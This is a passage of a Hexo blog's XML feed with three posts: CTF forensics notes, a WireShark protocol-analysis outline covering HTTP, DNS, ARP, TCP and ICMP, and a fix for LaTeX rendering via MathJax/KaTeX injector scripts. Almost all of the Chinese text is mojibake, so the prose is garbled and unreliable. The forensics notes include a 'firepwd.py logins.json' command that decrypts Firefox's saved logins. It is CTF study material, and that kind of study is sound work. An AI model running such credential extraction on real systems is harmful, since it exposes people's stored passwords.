    <content type="html"><![CDATA[<p>å·¥å…·ï¼švolã€DiskGeniusã€R-Studioã€å–è¯å¤§å¸ˆã€FTKã€VeraCrypt</p><h2 id="fatæ–‡ä»¶"><a href="#fatæ–‡ä»¶" class="headerlink" title="fatæ–‡ä»¶"></a>fatæ–‡ä»¶</h2><p>å¯ç”¨VeraCryptè¿›è¡ŒæŒ‚è½½</p><p>ä¸åŒçš„å¯†ç å¯èƒ½è¿›å…¥ä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿ</p><h2 id="firefoxç™»é™†å‡­è¯"><a href="#firefoxç™»é™†å‡­è¯" class="headerlink" title="firefoxç™»é™†å‡­è¯"></a>firefoxç™»é™†å‡­è¯</h2><p>å·²çŸ¥<code>key.dbã€logins.json</code></p><p>å¯åœ¨<code>firepwd</code>æ–‡ä»¶å¤¹ä¸‹ä½¿ç”¨<code>python firepwd.py logins.json</code></p><h2 id="DOSæ‰‡åŒºæ•°æ®"><a href="#DOSæ‰‡åŒºæ•°æ®" class="headerlink" title="DOSæ‰‡åŒºæ•°æ®"></a>DOSæ‰‡åŒºæ•°æ®</h2><p>æå–æ•°æ®ä¸º.datæ–‡ä»¶åï¼Œä½¿ç”¨<code>testdisk</code>æ¢å¤æ–‡ä»¶</p><p>ä¸€è·¯å›è½¦</p><p>Proceed&gt;None&gt;Advanced&gt;Boot&gt;Rebuild BS&gt;List</p><p>é€‰æ‹©æœ‰ç‰¹æ®Šæ•°æ®çš„æ–‡ä»¶æŒ‰cå¤åˆ¶åˆ°</p><p>æ–‡ä»¶å¤¹ä¸‹</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISCæµé‡åˆ†æ</title>
    <link href="/2025/04/02/MISC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <url>/2025/04/02/MISC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="æ¦‚æ‹¬"><a href="#æ¦‚æ‹¬" class="headerlink" title="æ¦‚æ‹¬"></a>æ¦‚æ‹¬</h2><ul><li><p>åè®®åˆ†æ</p><ul><li><p>HTTP</p></li><li><p>HTTPS</p></li><li><p>FTP</p></li><li><p>DNS</p></li><li><p>WIFI</p></li><li><p>USB</p></li><li><p>VOIP</p></li><li><p>ç”µå­é‚®ä»¶åè®®ï¼ˆSMTPã€POPã€IMAPã€MIMEï¼‰</p></li></ul></li><li><p>æ•°æ®æå–</p><ul><li><p>å­—ç¬¦ä¸²æå–</p></li><li><p>æ–‡ä»¶æå–</p></li></ul></li><li><p>æµé‡åŒ…ä¿®å¤</p></li></ul><h2 id="åšé¢˜æ­¥éª¤"><a href="#åšé¢˜æ­¥éª¤" class="headerlink" title="åšé¢˜æ­¥éª¤"></a>åšé¢˜æ­¥éª¤</h2><ul><li><p>æ€»ä½“æŠŠæ¡</p><ul><li><p>åè®®åˆ†çº§</p></li><li><p>ç«¯ç‚¹ç»Ÿè®¡</p></li></ul></li><li><p>è¿‡æ»¤ç­›é€‰</p><ul><li><p>è¿‡æ»¤è¯­æ³•</p></li><li><p>Hostï¼ŒProtocolï¼Œcontainsï¼Œç‰¹å¾å€¼</p></li></ul></li><li><p>å‘ç°å¼‚å¸¸</p><ul><li><p>ç‰¹æ®Šå­—ç¬¦ä¸²</p></li><li><p>åè®®æŸå­—æ®µ</p></li><li><p>flagä½äºæœåŠ¡å™¨ä¸­</p></li></ul></li><li><p>æ•°æ®æå–</p><ul><li><p>å­—ç¬¦ä¸²æå–</p></li><li><p>æ–‡ä»¶æå–</p></li></ul></li></ul><h2 id="åè®®åˆ†æ"><a href="#åè®®åˆ†æ" class="headerlink" title="åè®®åˆ†æ"></a>åè®®åˆ†æ</h2><ul><li><p>æ¦‚è¿°ï¼šè®¡ç®—æœºç½‘ç»œä¸­è¿›è¡Œæ•°æ®äº¤æ¢è€Œå»ºç«‹çš„è§„åˆ™ã€æ ‡å‡†æˆ–çº¦å®šçš„é›†åˆã€‚</p></li><li><p>åè®®åˆ†çº§ï¼ŒWireSharkæä¾›äº†æ­¤åŠŸèƒ½ã€‚</p></li></ul><p><img src="/2025/04/02/MISC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/file-20250402195352685.png"></p><ul><li><p>ä¼šè¯ï¼Œèƒ½å¤Ÿæ˜¾ç¤ºç‰¹å®šç«¯ç‚¹IPä¹‹é—´çš„æ‰€æœ‰æµé‡ã€‚</p></li><li><p>ç«¯ç‚¹ï¼ŒWireSharkèƒ½åˆ—å‡ºæ‰€æœ‰ç»Ÿè®¡çš„ç«¯ç‚¹ä¿¡æ¯ã€‚</p></li><li><p><strong>HTTP</strong>ï¼ˆè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰</p><ul><li>æ¦‚å¿µï¼šç”¨äºåˆ†å¸ƒå¼ã€åä½œå¼å’Œè¶…åª’ä½“ä¿¡æ¯ç³»ç»Ÿçš„åº”ç”¨å±‚åè®®ã€‚</li></ul></li><li><p><strong>HTTPS</strong>ï¼ˆ&#x3D; HTTP + SSL &#x2F; TLSï¼‰</p></li><li><p><strong>FTP</strong>ï¼ˆæ–‡ä»¶ä¼ è¾“åè®®ï¼‰</p><ul><li><p>æ˜¯TCP&#x2F;IPåè®®ç»„ä¸­çš„åè®®ä¹‹ä¸€ã€‚</p></li><li><p>ä¸€ã€FTPæœåŠ¡å™¨ï¼šå­˜å‚¨æ–‡ä»¶</p></li><li><p>äºŒã€FTPå®¢æˆ·ç«¯ï¼šç”¨æˆ·å¯ä½¿ç”¨å®¢æˆ·ç«¯é€šè¿‡FTPåè®®è®¿é—®ä½äºFTPæœåŠ¡å™¨ä¸Šçš„èµ„æºã€‚</p></li></ul></li><li><p><strong>DNS</strong>ï¼ˆé€šå¸¸ç§°ä¸ºUDPåè®®ï¼‰</p><ul><li>æŠ¥æ–‡æ ¼å¼</li></ul><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+-------------------------------+</span><br><span class="hljs-section">| æŠ¥æ–‡å¤´                         |</span><br><span class="hljs-section">+-------------------------------+</span><br><span class="hljs-section">| é—®é¢˜ (å‘æœåŠ¡å™¨æå‡ºçš„æŸ¥è¯¢éƒ¨åˆ†)    |</span><br><span class="hljs-section">+-------------------------------+</span><br><span class="hljs-section">| å›ç­” (æœåŠ¡å™¨å›å¤çš„èµ„æºè®°å½•)      |</span><br><span class="hljs-section">+-------------------------------+</span><br><span class="hljs-section">| æˆæƒ (æƒå¨çš„èµ„æºè®°å½•)           |</span><br><span class="hljs-section">+-------------------------------+</span><br><span class="hljs-section">| é¢å¤–çš„ (é¢å¤–çš„èµ„æºè®°å½•)         |</span><br><span class="hljs-section">+-------------------------------+</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­questionéƒ¨åˆ†æ ¼å¼ä¸º</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs haskell">  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">2</span>  <span class="hljs-number">3</span>  <span class="hljs-number">4</span>  <span class="hljs-number">5</span>  <span class="hljs-number">6</span>  <span class="hljs-number">7</span>  <span class="hljs-number">8</span>  <span class="hljs-number">9</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">2</span>  <span class="hljs-number">3</span>  <span class="hljs-number">4</span>  <span class="hljs-number">5</span><br>+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+<br>|                                               |<br>/                     <span class="hljs-type">QNAME</span>                     /<br>/                                               /<br>+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+<br>|                     <span class="hljs-type">QTYPE</span>                     |<br>+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+<br>|                     <span class="hljs-type">QCLASS</span>                    |<br>+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+<br></code></pre></td></tr></table></figure><blockquote><p><strong>QNAME:</strong> æŸ¥è¯¢çš„åŸŸåï¼Œé•¿åº¦å¯å˜</p><p><strong>QTYPE:</strong> æŸ¥è¯¢ç±»å‹ï¼Œå…±16ç§</p></blockquote></li><li><p><strong>WIFI</strong> </p><blockquote><p>802.11æ˜¯æ— çº¿å±€åŸŸç½‘çš„é€šç”¨æ ‡å‡†ã€‚</p></blockquote><p>å¸¸è§è®¤è¯æ–¹å¼ï¼š</p><ul><li><p>ä¸å¯ç”¨å®‰å…¨</p></li><li><p>WEP</p></li><li><p>WPA&#x2F;WPA2-PSKï¼ˆé¢„å…±äº«å¯†é’¥ï¼‰</p></li><li><p>PA&#x2F;WPA2 802.1Xï¼ˆradiusè®¤è¯ï¼‰</p></li></ul></li><li><p><strong>USB</strong> </p><ul><li><p>é¼ æ ‡åè®®</p></li><li><p>é”®ç›˜åè®®</p></li></ul></li><li><p><strong>ARP</strong>ï¼ˆåœ°å€è§£æåè®®ï¼‰</p><ul><li><p>æ¦‚å¿µï¼šå°†ç½‘ç»œå±‚åœ°å€ï¼ˆå¦‚ IP åœ°å€ï¼‰è§£æä¸ºæ•°æ®é“¾è·¯å±‚åœ°å€ï¼ˆå¦‚ MAC åœ°å€ï¼‰çš„åè®®ã€‚</p></li><li><p><strong>æ ¸å¿ƒåŠŸèƒ½ï¼š</strong> å¹¿æ’­è¯·æ±‚å’Œå•æ’­å“åº”</p></li></ul><p>1.APRè¯·æ±‚</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sequence">å‘é€æ–¹-&gt;å±€åŸŸç½‘: ARPè¯·æ±‚ï¼ˆè°æœ‰192.168.1.2?ï¼‰<br>Note over å±€åŸŸç½‘: å¹¿æ’­ARPè¯·æ±‚<br></code></pre></td></tr></table></figure><p>Â Â Â Â Â Â Â Â 2.APRå“åº”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sequence">å±€åŸŸç½‘-&gt;æ¥æ”¶æ–¹: ARPè¯·æ±‚ï¼ˆè°æœ‰192.168.1.2?ï¼‰<br>æ¥æ”¶æ–¹-&gt;å‘é€æ–¹: ARPå“åº”ï¼ˆ00:1A:2B:3C:4D:5Eï¼‰<br>Note over æ¥æ”¶æ–¹,å±€åŸŸç½‘: å•æ’­ARPå“åº”<br></code></pre></td></tr></table></figure><p>Â Â Â Â Â Â Â Â 3.ARPç¼“å­˜ï¼šå‘é€æ–¹åœ¨æ”¶åˆ°ARPå“åº”åï¼Œå°†IPåœ°å€å’ŒMACåœ°å€æ˜ å°„å…³ç³»å­˜åœ¨ARPç¼“å­˜ä¸­ã€‚</p><ul><li><p><strong>TCP</strong>ï¼ˆä¼ è¾“æ§åˆ¶åè®®ï¼‰</p><ul><li><p><strong>æ¦‚å¿µï¼š</strong> ä½äºä¼ è¾“å±‚ï¼Œæä¾›äº†å¯é çš„ã€é¢å‘è¿æ¥çš„ã€åŸºäºå­—èŠ‚æµçš„æ•°æ®ä¼ è¾“æœåŠ¡ã€‚</p></li><li><p><strong>ç‰¹ç‚¹ï¼š</strong> ç¡®ä¿æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸ä¸¢å¤±ã€ä¸é‡å¤ï¼ŒæŒ‰é¡ºåºåˆ°è¾¾ã€‚</p></li><li><p><strong>å·¥ä½œåŸç†ï¼š</strong></p><ul><li>â€œ<strong>ä¸‰æ¬¡æ¡æ‰‹</strong>â€å»ºç«‹è¿æ¥</li></ul></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sequence">å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨: SYNï¼ˆåŒæ­¥è¯·æ±‚ï¼‰<br>æœåŠ¡å™¨ -&gt; å®¢æˆ·ç«¯: SYN-ACKï¼ˆåŒæ­¥ç¡®è®¤ï¼‰<br>å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨: ACKï¼ˆç¡®è®¤ï¼‰<br>Note over å®¢æˆ·ç«¯,æœåŠ¡å™¨: è¿æ¥å»ºç«‹ï¼Œå¼€å§‹æ•°æ®ä¼ è¾“<br></code></pre></td></tr></table></figure><pre><code class="hljs">* **æ•°æ®ä¼ è¾“**  * åºåˆ—å·ã€ç¡®è®¤å·  - é‡ä¼ æœºåˆ¶  - æµé‡æ§åˆ¶  - æ‹¥å¡æ§åˆ¶* â€œ**å››æ¬¡æŒ¥æ‰‹**â€ç»ˆæ­¢è¿æ¥</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sequence">å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨ : FINï¼ˆç»“æŸè¯·æ±‚ï¼‰<br>æœåŠ¡å™¨ -&gt; å®¢æˆ·ç«¯ : ACKï¼ˆç¡®è®¤ï¼‰<br>æœåŠ¡å™¨ -&gt; å®¢æˆ·ç«¯ : FINï¼ˆç»“æŸè¯·æ±‚ï¼‰<br>å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨ : ACKï¼ˆç¡®è®¤ï¼‰<br></code></pre></td></tr></table></figure><pre><code class="hljs">* **ç‰¹æ®Šæƒ…å†µï¼š**  - [RST]ï¼šç«‹å³ç»ˆæ­¢ï¼Œè¡¨ç¤ºå¤ä½æˆ–é‡ç½®</code></pre><ul><li><p><strong>ICMP</strong> ï¼ˆäº’è”ç½‘æ§åˆ¶æ¶ˆæ¯åè®®ï¼‰</p><ul><li><p>æ˜¯TCP&#x2F;IPåè®®ç»„ä¸­çš„åè®®ä¹‹ä¸€ã€‚</p></li><li><p>ç”¨äºè¯Šæ–­ç½‘ç»œé—®é¢˜ã€æ£€æµ‹ç½‘ç»œå¯è¾¾æ€§ã€æŠ¥å‘Šé”™è¯¯æ¡ä»¶ã€‚</p></li><li><p>å¸¸è§å·¥å…·å¦‚<strong>ping</strong> ã€<strong>traceroute</strong> éƒ½ä¾èµ–äºICMPã€‚</p></li><li><p><strong>å¸¸è§æ¶ˆæ¯ç±»å‹ï¼š</strong></p><ul><li><p><strong>å›æ˜¾è¯·æ±‚ï¼ˆEcho Requestï¼‰ã€å›æ˜¾åº”ç­”ï¼ˆEcho Replyï¼‰</strong></p><ul><li>ç”¨äº<code>ping</code>ï¼Œæ£€æµ‹ç½‘ç»œè¿é€šæ€§ã€‚</li></ul></li><li><p><strong>ç›®çš„ä¸å¯è¾¾ï¼ˆDestination Unreachableï¼‰</strong></p><ul><li>æŠ¥å‘ŠåŸå› ï¼šå¦‚ç½‘ç»œä¸å¯è¾¾ã€ç«¯å£ä¸å¯è¾¾ã€‚</li></ul></li><li><p><strong>è¶…æ—¶ï¼ˆTime Exceededï¼‰</strong></p><ul><li>æŠ¥å‘Šæ•°æ®åŒ…çš„<code>TTL</code>å€¼è€—å°½ï¼Œç”¨äº<code>traceroute</code>ã€‚</li></ul></li><li><p><strong>é‡å®šå‘ï¼ˆRedirectï¼‰</strong></p><ul><li>é€šçŸ¥å‘é€æ–¹ä½¿ç”¨æ›´ä¼˜çš„è·¯ç”±è·¯å¾„ã€‚</li></ul></li></ul></li></ul></li><li><p><strong>VOIP</strong> (åŸºäºIPçš„è¯­éŸ³ä¼ è¾“)</p><p><strong>ç½‘é™…åè®®ï¼š</strong></p><ul><li><p><strong>ä¼šè¯å‘èµ·åè®®ï¼ˆSIPï¼‰</strong></p></li><li><p><strong>ä¼šè¯æè¿°åè®®ï¼ˆSDPï¼‰</strong></p></li><li><p><strong>å®æ—¶ä¼ è¾“åè®®ï¼ˆRTPï¼‰</strong></p></li><li><p><strong>H.323</strong></p></li></ul><p><strong>æ”»å‡»æ–¹æ³•ï¼š</strong> æŠ“åŒ…ååœ¨Wiresharkä¸­çš„â€ç”µè¯ -&gt; Voipâ€é€šè¯ä¸­åˆ†æã€‚</p></li><li><p><strong>ç”µå­é‚®ä»¶åè®®</strong></p><ul><li><p>SMTPï¼šç”µå­é‚®ä»¶å‘é€åè®®</p><ul><li>é»˜è®¤ç«¯å£å·ï¼š25</li></ul></li><li><p>POPï¼šç”µå­é‚®ä»¶æ¥æ”¶åè®®</p><ul><li>é»˜è®¤ç«¯å£å·ï¼š110</li></ul></li><li><p>IMAPï¼šç”µå­é‚®ä»¶æ¥æ”¶åè®®</p><ul><li>é»˜è®¤ç«¯å£å·ï¼š143</li></ul></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo+Fulidä¸»é¢˜ä¸­çš„Latexæ¸²æŸ“é—®é¢˜</title>
    <link href="/2025/04/02/Hexo+Fulid%E4%B8%BB%E9%A2%98%E4%B8%AD%E7%9A%84Latex%E6%B8%B2%E6%9F%93%E9%97%AE%E9%A2%98/"/>
    <url>/2025/04/02/Hexo+Fulid%E4%B8%BB%E9%A2%98%E4%B8%AD%E7%9A%84Latex%E6%B8%B2%E6%9F%93%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘å†™ctfå¯†ç å­¦åšå®¢æ—¶é‡è§äº†è®¸å¤šé—®é¢˜ï¼ŒLatexæ¸²æŸ“é”™ä½&#x2F;ä¸æ¸²æŸ“ï¼Œå¯¼è‡´åšå®¢æ— æ³•æ­£å¸¸è§‚çœ‹ï¼Œäºæ˜¯æˆ‘åœ¨ç½‘ä¸Šæ‰¾äº†è®¸å¤šæ•™ç¨‹ï¼Œä¹Ÿæ‰¾äº†å¤§ä½¬å’¨è¯¢ï¼Œä½†äººä¸äººçš„æ‚²æ¬¢å¹¶ä¸ç›¸åŒï¼Œæœ€åæ‰¾äº†ä¸€ç§æ¯”è¾ƒåŸå§‹çš„æ–¹æ³•ï¼Œæ‰è§£å†³äº†æˆ‘çš„é—®é¢˜ï¼Œå¦‚æœæœ‰äººè·Ÿæˆ‘æœ‰ç›¸åŒçš„å›°æ‰°ï¼Œå¯ä»¥å‚è€ƒå‚è€ƒã€‚</p><h2 id="é‡è§çš„é—®é¢˜"><a href="#é‡è§çš„é—®é¢˜" class="headerlink" title="é‡è§çš„é—®é¢˜"></a>é‡è§çš„é—®é¢˜</h2><p>é¦–å…ˆè®°å½•ä¸€ä¸‹æˆ‘é‡è§çš„é—®é¢˜ï¼Œå¼€å§‹é»˜è®¤çš„latexæ¸²æŸ“å™¨ä¸èƒ½å®Œå…¨æ¸²æŸ“ï¼Œåæ¥ç…§ç€ç½‘ä¸Šæ•™ç¨‹ä½¿ç”¨äº†<code>hexo-renderer-markdown-it-plus</code>+<code>katex</code> ç„¶é¹…å¹¶æ²¡æœ‰è§£å†³æˆ‘çš„é—®é¢˜ã€‚<br>åæ¥åœ¨å¤§ä½¬çš„æŒ‡ç‚¹ä¸‹ä½¿ç”¨äº†æ›´ä¸ºç¨³å®šçš„<code>hexo-renderer-kramed</code>+<code>mathjax</code>ï¼Œä½†æ˜¯ä¸çŸ¥é“æ˜¯CDNçš„é—®é¢˜é—®é¢˜è¿˜æ˜¯æ€æ ·ï¼Œåœ¨æœ¬åœ°éƒ¨ç½²æ—¶èƒ½å¥½å¥½çš„ï¼Œä½†æ˜¯åœ¨éƒ¨ç½²åˆ°è¿œç«¯æœåŠ¡å™¨ä¹‹åï¼Œç½‘é¡µè¿˜æ˜¯æ¸²æŸ“å¤±è´¥ï¼ŒæŸ¥çœ‹äº†ä¸€ä¸‹æ§åˆ¶å°ï¼Œ å‘ç°CDNé»˜è®¤è®¿é—®<code>http</code>ï¼Œç”±äº<code>https</code>å’Œ<code>http</code>ä¸èƒ½æ··ç”¨ï¼Œä¸€èˆ¬æµè§ˆå™¨é»˜è®¤ä¼šæ‹’ç»è®¿é—®ï¼Œè‹¥ä½ åœ¨æµè§ˆå™¨å·¦ä¸Šè§’<strong>å°é”</strong>çš„<strong>æ­¤ç½‘ç«™æƒé™</strong>ä¸­å°†<strong>ä¸å®‰å…¨å†…å®¹</strong>è®¾ä¸ºå¼€å¯ï¼Œä¾¿èƒ½æ¸²æŸ“æˆåŠŸã€‚ï¼ˆæˆ‘æš‚æ—¶æ²¡æ‰¾åˆ°è¿™ä¸ªæ–¹æ¡ˆçš„è§£å†³åŠæ³•ï¼Œæœ‰è§£å†³åŠæ³•çš„å¸ˆå‚…å¯ä»¥è¯„è®ºåŒºå‘Šè¯‰æˆ‘ã€‚ã€‚ã€‚ï¼‰</p><h2 id="å¼•å…¥è„šæœ¬è§£å†³Latexæ¸²æŸ“é—®é¢˜"><a href="#å¼•å…¥è„šæœ¬è§£å†³Latexæ¸²æŸ“é—®é¢˜" class="headerlink" title="å¼•å…¥è„šæœ¬è§£å†³Latexæ¸²æŸ“é—®é¢˜"></a>å¼•å…¥è„šæœ¬è§£å†³Latexæ¸²æŸ“é—®é¢˜</h2><p>æœ€åï¼Œæˆ‘ä½¿ç”¨äº†å¼•å…¥<code>javascript</code>è„šæœ¬çš„æ–¹æ³•è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œä¸‹é¢ä»‹ç»å…·ä½“å®ç°æ–¹æ³•ã€‚</p><ul><li>é¦–å…ˆï¼Œæ£€æŸ¥markdownæ¸²æŸ“ç¯å¢ƒï¼Œæœ€å¥½ä½¿ç”¨é»˜è®¤çš„<code>hexo-renderer-marked</code> ,å¦‚æœæœ‰å…¶ä»–çš„ï¼Œæœ€å¥½å…ˆå¸è½½æ‰ï¼Œå¦åˆ™ä¼šå‡ºç°æ¸²æŸ“å†²çªçš„é—®é¢˜</li></ul><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> uninstall hexo-renderer-kramed<br><span class="hljs-built_in">npm</span> uninstall hexo-renderer-pandoc<br><br><span class="hljs-built_in">npm</span> install hexo-renderer-marked<br></code></pre></td></tr></table></figure><blockquote><p>å¦‚æœä½ æ˜¯é»˜è®¤è®¾ç½®çš„è¯ï¼Œå°±æ²¡å¿…è¦åšè¿™ä¸€æ­¥äº†ã€‚</p></blockquote><ul><li>å¼•å…¥è„šæœ¬ï¼Œè¿™é‡Œåˆ†ä¸¤ç§æ–¹å¼<ul><li>ä¸€ã€åœ¨åšå®¢æ–‡ç« çš„mdæ–‡ä»¶ä¸­å¼•å…¥<code>javascript</code>è„šæœ¬ï¼Œæ¨èå†™å¥½æ¨¡æ¿ï¼Œåœ¨éœ€è¦æ•°å­¦å…¬å¼çš„åšå®¢æ–‡ç« ç›´æ¥å¼•å…¥æ¨¡æ¿ã€‚</li><li>äºŒã€<code>hexo 5.0</code>ä»¥ä¸Šçš„å¯ä»¥ä½¿ç”¨æ³¨å…¥å™¨ï¼Œå¯åœ¨<code>/themes/fluid/scripts</code>ä¸­æ·»åŠ <code>js</code>æ–‡ä»¶ï¼Œä¸‹é¢ä¸¤ä¸ªä»»é€‰å…¶ä¸€ã€‚</li></ul></li></ul><p><code>mathjax.js</code></p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gml">hexo.extend.injector.register(<span class="hljs-string">&#x27;body_end&#x27;</span>, `<br>&lt;<span class="hljs-variable language_">script</span>&gt;  <br>MathJax = &#123;  <br>tex: &#123;  <br>inlineMath: [[<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>], [<span class="hljs-string">&#x27;\\(&#x27;</span>, <span class="hljs-string">&#x27;\\)&#x27;</span>]]  <br>&#125;  <br>&#125;;  <br>&lt;/<span class="hljs-variable language_">script</span>&gt;  <br>&lt;<span class="hljs-variable language_">script</span> <span class="hljs-variable language_">id</span>=<span class="hljs-string">&quot;MathJax-script&quot;</span> async  <br>src=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js&quot;</span>&gt;  <br>&lt;/<span class="hljs-variable language_">script</span>&gt;<br>`, <span class="hljs-string">&#x27;default&#x27;</span>);<br></code></pre></td></tr></table></figure><p><code>katex.js</code></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xquery">hexo.extend.injector.register(<span class="hljs-string">&#x27;body_end&#x27;</span>, `<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css&quot;</span> <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-GvrOXuhMATgEsSwCs4smul74iXGOixntILdUW9XmUC6+HX0sLNAK3q71HotJqlAn&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">defer</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js&quot;</span> <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-cpW21h6RZv/phavutF+AuVYrr+dA8xD9zs6FwLpaCct6O9ctzYFfFr4dgmgccOTx&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br>&lt;script defer src=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js&quot;</span> integrity=<span class="hljs-string">&quot;sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05&quot;</span> crossorigin=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;&lt;/script&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">Â  Â  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;DOMContentLoaded&quot;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span></span><span class="language-xquery">&#123;</span><br><span class="language-xquery">Â  Â  Â  Â  renderMathInElement<span class="hljs-built_in">(document</span>.body, &#123;</span><br><span class="language-xquery">Â  Â  Â  Â  Â  // customised options</span><br><span class="language-xquery">Â  Â  Â  Â  Â  // â€¢ auto-render specific keys, e.g.:</span><br><span class="language-xquery">Â  Â  Â  Â  delimiters: [</span><br><span class="language-xquery">Â  Â  Â  Â  Â  Â  &#123;left: <span class="hljs-string">&#x27;$$&#x27;</span>, right: <span class="hljs-string">&#x27;$$&#x27;</span>, display:<span class="hljs-built_in"> true</span>&#125;</span><span class="language-xml">,</span><br><span class="language-xml">Â  Â  Â  Â  Â  Â  </span><span class="language-xquery">&#123;left: <span class="hljs-string">&#x27;$&#x27;</span>, right: <span class="hljs-string">&#x27;$&#x27;</span>, display:<span class="hljs-built_in"> false</span>&#125;</span><span class="language-xml"><span class="language-javascript">,</span></span><br><span class="language-javascript"><span class="language-xml">Â  Â  Â  Â  Â  Â  <span class="hljs-comment">//</span></span></span><span class="language-xquery">&#123;left: <span class="hljs-string">&#x27;\\(&#x27;</span>, right: <span class="hljs-string">&#x27;\\)&#x27;</span>, display:<span class="hljs-built_in"> false</span>&#125;</span><span class="language-xml"><span class="language-javascript">,</span></span><br><span class="language-javascript"><span class="language-xml">Â  Â  Â  Â  Â  Â  <span class="hljs-comment">//</span></span></span><span class="language-xquery">&#123;left: <span class="hljs-string">&#x27;\\[&#x27;</span>, right: <span class="hljs-string">&#x27;\\]&#x27;</span>, display:<span class="hljs-built_in"> 